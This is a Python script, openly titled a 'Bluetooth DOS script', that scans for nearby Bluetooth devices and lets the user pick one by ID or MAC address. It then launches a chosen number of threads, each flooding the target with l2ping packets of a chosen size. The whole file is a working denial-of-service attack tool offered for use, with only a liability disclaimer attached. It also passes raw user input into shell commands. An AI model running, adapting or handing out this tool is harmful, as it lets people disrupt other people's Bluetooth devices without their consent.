import os
import threading
import time
import subprocess

def DOS(target_addr, packages_size):
    os.system(f"l2ping -i hci0 -s {packages_size} -f {target_addr}")

def printLogo():
    print('Bluetooth DOS script')

def main():
    printLogo()
    time.sleep(0.1)
    print('\n\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND.'
    ' YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF'
    ' THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE'
    ' OR DAMAGE CAUSED BY THIS PROGRAM.\n')

    if input("Do you agree? (y/n) > ") in ['y', 'Y']:
        time.sleep(0.1)
        os.system('clear')
        printLogo()
        print("\nScanning...")

        try:
            output = subprocess.check_output('hcitool scan', shell=True, stderr=subprocess.STDOUT, text=True)
            lines = output.splitlines()[1:]  # Skip the first line
        except subprocess.CalledProcessError:
            print("[!] ERROR: Failed to execute hcitool scan")
            return

        array = []
        print("ID | MAC Address | Device Name")
        for id, line in enumerate(lines):
            info = line.split()
            if len(info) >= 2:
                mac = info[0]
                name = ' '.join(info[1:])
                array.append(mac)
                print(f"{id} | {mac} | {name}")

        target_id = input('Target ID or MAC > ')

        try:
            target_addr = array[int(target_id)]
        except (ValueError, IndexError):
            target_addr = target_id

        if not target_addr:
            print("[!] ERROR: Invalid target address")
            return

        try:
            threads_count = int(input("Enter number of threads: "))
            packages_size = int(input("Enter packet size: "))
        except ValueError:
            print("[!] ERROR: Threads count and packet size must be integers")
            return

        os.system('clear')
        print("\x1b[31m[*] Starting DOS attack in 3 seconds...\n")
        time.sleep(3)

        for i in range(threads_count):
            print(f"[*] Building thread {i+1}")
            threading.Thread(target=DOS, args=(target_addr, packages_size)).start()

        print("[*] All threads started...")
        print("[*] Attack in progress...")

    else:
        print("Exiting...")
        return

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Aborted")
    except Exception as e:
        print(f"\n[!] ERROR: {e}")
